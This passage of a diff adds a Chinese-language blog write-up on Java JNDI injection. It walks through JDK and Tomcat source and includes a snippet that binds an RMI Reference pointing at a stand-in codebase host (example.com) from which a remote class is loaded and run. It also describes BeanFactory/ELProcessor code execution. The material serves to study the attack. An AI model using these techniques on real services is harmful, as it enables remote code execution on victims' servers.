+    <span class="token keyword">if</span> <span class="token punctuation">(</span>refInfo <span class="token keyword">instanceof</span> <span class="token class-name">Reference</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        ref <span class="token operator">=</span> <span class="token punctuation">(</span>Reference<span class="token punctuation">)</span> refInfo<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+    Object answer<span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// Here</span>
+        String f <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token comment" spellcheck="true">// if reference identifies a factory, use exclusively</span>
+
+            factory <span class="token operator">=</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span> environment<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">}</span></code></pre>
+<p>getObjectFactoryFromReference，先在本地CLASSPATH中查找目标类，没有的话即通过codebase(远程代码库)获取目标工厂类，最后返回实例化</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// javax.naming.spi.NamingManager#getObjectFactoryFromReference</span>
+<span class="token keyword">static</span> ObjectFactory <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>Reference ref<span class="token punctuation">,</span> String factoryName<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalAccessException<span class="token punctuation">,</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment" spellcheck="true">// Try to use current class loader</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+         clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> 
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token comment" spellcheck="true">// Not in class path; try to use codebase</span>
+    String codebase<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> 
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>loadClass 函数</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// com.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)</span>
+<span class="token comment" spellcheck="true">/**
+ * @param className A non-null fully qualified class name.
+ * @param codebase A non-null, space-separated list of URL strings.
+ */</span>
+<span class="token keyword">public</span> Class <span class="token class-name">loadClass</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String codebase<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> MalformedURLException <span class="token punctuation">{</span>
+
+    ClassLoader parent <span class="token operator">=</span> <span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ClassLoader cl <span class="token operator">=</span> URLClassLoader<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token function">getUrlArray</span><span class="token punctuation">(</span>codebase<span class="token punctuation">)</span><span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> cl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<blockquote>
+<p>因为newInstance必然只会调用无参构造方法,所以该class需要有定义一个无参的构造方法或者是根本无构造方法(在无任何构造方法的情况下会隐式生成一个无参构造方法), 如果没有无参构造方法newInstance就直接出错了</p>
+</blockquote>
+<p>一般在这里就可以通过触发构造方法执行payload</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="RMI-1"><a href="#RMI-1" class="headerlink" title="RMI"></a>RMI</h3><h4 id="JNDI-Peference"><a href="#JNDI-Peference" class="headerlink" title="JNDI Peference"></a>JNDI Peference</h4><h5 id="攻击图解"><a href="#攻击图解" class="headerlink" title="攻击图解"></a>攻击图解</h5><p>为了不需要调用特定函数(eg. 如上面sayHello，因在实战中不方便获取调用函数名)，采用初始化时执行payload；同时初始化需要在目标服务器上执行，势必需要让目标服务器加载恶意class，需要配合 JNDI Peference 触发动态转换，加载目标类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15523727652417.jpg" alt></p>
+<h4 id="JNDI-Reference-Payload"><a href="#JNDI-Reference-Payload" class="headerlink" title="JNDI Reference Payload"></a>JNDI Reference Payload</h4><p>如果远程获取 RMI 服务上的对象为<code>Reference 类或者其子类</code>，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化</p>
+<p>Reference 中几个比较关键的属性：</p>
+<ol>
+<li>className - 远程加载时所使用的类名</li>
+<li>classFactory - 加载的 class 中需要实例化类的名称</li>
+<li>classFactoryLocation - 提供 classes 数据的地址可以是 file/ftp/http 等协议</li>
+</ol>
+<p>例如这里定义一个 Reference 实例，并使用继承了 UnicastRemoteObject 类的 ReferenceWrapper 包裹一下实例对象，使其能够通过 RMI 进行远程访问：</p>
+<pre class=" language-java"><code class="language-java">Reference refObj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"refClassName"</span><span class="token punctuation">,</span> <span class="token string">"insClassName"</span><span class="token punctuation">,</span> <span class="token string">"http://example.com:12345/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ReferenceWrapper refObjWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>refObj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"refObj"</span><span class="token punctuation">,</span> refObjWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>当有客户端通过<code>lookup(&quot;refObj&quot;)</code>获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的<code>CLASSPATH</code>去寻找被标识为<code>refClassName</code>的类，如果本地未找到，则会去请求<code>http://example.com:12345/refClassName.class</code>动态加载 classes 并调用<code>insClassName</code>的构造函数。</p>
+<h4 id="RMI-Remote-Object-Payload"><a href="#RMI-Remote-Object-Payload" class="headerlink" title="RMI Remote Object Payload"></a>RMI Remote Object Payload</h4><blockquote>
+<p>RMI 远程对象接口、实现方法可以被任何客户端通过http ftp smb服务进行修改或上传，远程对象的codebase在远程服务器中通过<code>java.rmi.server.codebase</code>进行描述，RMI 服务器在注册表中注册远程对象并绑定其对应的name，在 RMI 注册表中codebase被用于远程对象引用(remote object reference)的注释</p>
+</blockquote>
+<p>如果远程获取 RMI 服务上的对象为<code>目标类</code>，即可在 RMI 服务器 CLASSPATH 查找到(本地查找优先于远程搜索)，会尝试读取本地目标类，之后真正<strong>执行该函数是在远程服务端</strong>，执行完成后会将<strong>结果序列化</strong>返回给应用端</p>
+<p>例下面：使用 JNDI 获取远程 sayHello() 函数并传入 “RickGray” 参数进行调用<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15524424841168.jpg" alt></p>
+<h5 id="通过getObjectInstance实现JNDI注入"><a href="#通过getObjectInstance实现JNDI注入" class="headerlink" title="通过getObjectInstance实现JNDI注入"></a><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">通过getObjectInstance实现JNDI注入</a></h5><p>紧跟着上面<code>lookup</code>的代码，在获取目标工厂类实例之后，会调用getObjectInstance函数</p>
+<blockquote>
+<p>之前JNDI注入都是依靠于getObjectFactoryFromReference时，如果目标classpath里找不到指定的class时,会从远程codebase中下载class字节码，然后实例化<br>在出现了trustCodebaseURL的限制之后 已经不再能够从codebase中下载字节码，但是可以loadClass目标classpath下存在的类</p>
+</blockquote>
+<p><strong>如果能在一些常用的库中找到有getObjectInstance方法，并且在该方法可操控执行恶意代码，可以避免加载远程恶意类文件</strong></p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// javax.naming.spi.NamingManager#getObjectInstance</span>
+factory <span class="token operator">=</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span> environment<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>原文作者找到了继承ObjectFactory的org.apache.naming.factory.BeanFactory，重载实现getObjectInstance方法</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanFactory</span>
+    <span class="token keyword">implements</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>
+
+    <span class="token comment" spellcheck="true">/**
+     * Create a new Bean instance.
+     *
+     * @param obj The reference object describing the Bean
+     */</span>
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>
+                                    Hashtable environment<span class="token punctuation">)</span>
+        <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+            <span class="token keyword">try</span> <span class="token punctuation">{</span>
+
+                Reference ref <span class="token operator">=</span> <span class="token punctuation">(</span>Reference<span class="token punctuation">)</span> obj<span class="token punctuation">;</span>
+                String beanClassName <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Class <span class="token class-name">beanClass</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>
+                ClassLoader tcl <span class="token operator">=</span>
+                    Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>tcl <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                        beanClass <span class="token operator">=</span> tcl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                        beanClass <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+                BeanInfo bi <span class="token operator">=</span> Introspector<span class="token punctuation">.</span><span class="token function">getBeanInfo</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                PropertyDescriptor<span class="token punctuation">[</span><span class="token punctuation">]</span> pda <span class="token operator">=</span> bi<span class="token punctuation">.</span><span class="token function">getPropertyDescriptors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                Object bean <span class="token operator">=</span> beanClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token comment" spellcheck="true">/* Look for properties with explicitly configured setter */</span>
+                RefAddr ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                Map forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                String value<span class="token punctuation">;</span>
+
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    Class <span class="token class-name">paramTypes</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+                    paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
+                    String setterName<span class="token punctuation">;</span>
+                    <span class="token keyword">int</span> index<span class="token punctuation">;</span>
+
+                    <span class="token comment" spellcheck="true">/* Items are given as comma separated list */</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span>String param<span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token comment" spellcheck="true">/* A single item can either be of the form name=method
+                         * or just a property name (and we will use a standard
+                         * setter) */</span>
+                        index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            setterName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+                            setterName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span>
+                                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span>
+                                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                            forced<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>
+                                       beanClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>setterName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span><span class="token operator">|</span>SecurityException ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>
+                                <span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> setterName <span class="token operator">+</span>
+                                 <span class="token string">" not found for property "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+
+                Enumeration e <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token keyword">while</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+
+                    ra <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    String propName <span class="token operator">=</span> ra<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>Constants<span class="token punctuation">.</span>FACTORY<span class="token punctuation">)</span> <span class="token operator">||</span>
+                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">)</span> <span class="token operator">||</span> propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"auth"</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                    Object<span class="token punctuation">[</span><span class="token punctuation">]</span> valueArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+                    <span class="token comment" spellcheck="true">/* Shortcut for properties with explicitly configured setter */</span>
+                    Method method <span class="token operator">=</span> forced<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                        valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+                            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span><span class="token operator">|</span>
+                                 IllegalArgumentException<span class="token operator">|</span>
+                                 InvocationTargetException ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>
+                                <span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
+                                 <span class="token string">" threw exception for property "</span> <span class="token operator">+</span> propName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">}</span>
+                        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
+<ul>
+<li>目标类</li>
+<li>通过解析ref.get(“forceString”)，如果forceString属性值含有<code>=</code>号，左侧为属性值，右侧为该属性值对应setter方法；如果没有<code>=</code>号，即大写首位并在开头添加<code>set</code>拼接为setter方法。然后将参数、setter方法作为键值放入HashMap中</li>
+<li>除forceString之外的属性进入 while 循环，如果属性类型不是<code>factory</code> or <code>scope</code> or <code>auth</code> or <code>forceString</code> or <code>singleton</code>时，会从 HashMap 中查找相应setter方法并进行发射调用</li>
+</ul>
+<p>但还要注意到，代码里限制了被调用函数只能有一个String参数</p>
+<pre class=" language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+beanClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>propName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span></code></pre>
+<p>原文作者在这里选用javax.el.ELProcessor类, 调用eval方法进行el注入实现RCE</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">eval</span><span class="token punctuation">(</span>String expression<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 id="LADP"><a href="#LADP" class="headerlink" title="LADP"></a>LADP</h3><h4 id="JNDI-Peference-1"><a href="#JNDI-Peference-1" class="headerlink" title="JNDI Peference"></a>JNDI Peference</h4><h5 id="攻击图解-1"><a href="#攻击图解-1" class="headerlink" title="攻击图解"></a>攻击图解</h5><p>和 RMI &amp; JNDI Peference 相似，区别是 LADP 为目录服务，且允许对各个被存储对象分配属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15523729112171.jpg" alt></p>
+<p>关键函数</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// com.sun.jndi.ldap.LdapCtx#c_lookup</span>
+var3 <span class="token operator">=</span> Obj<span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span> DirectoryManager<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>envprops<span class="token punctuation">,</span> <span class="token punctuation">(</span>Attributes<span class="token punctuation">)</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// com.sun.jndi.ldap.Obj#decodeObject</span>
+
+<span class="token keyword">static</span> Object <span class="token function">decodeObject</span><span class="token punctuation">(</span>Attributes var0<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+    String<span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token function">getCodebases</span><span class="token punctuation">(</span>var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        Attribute var1<span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// javaSerializedData</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ClassLoader var3 <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">getURLClassLoader</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token function">deserializeObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment" spellcheck="true">// javaRemoteLocation </span>
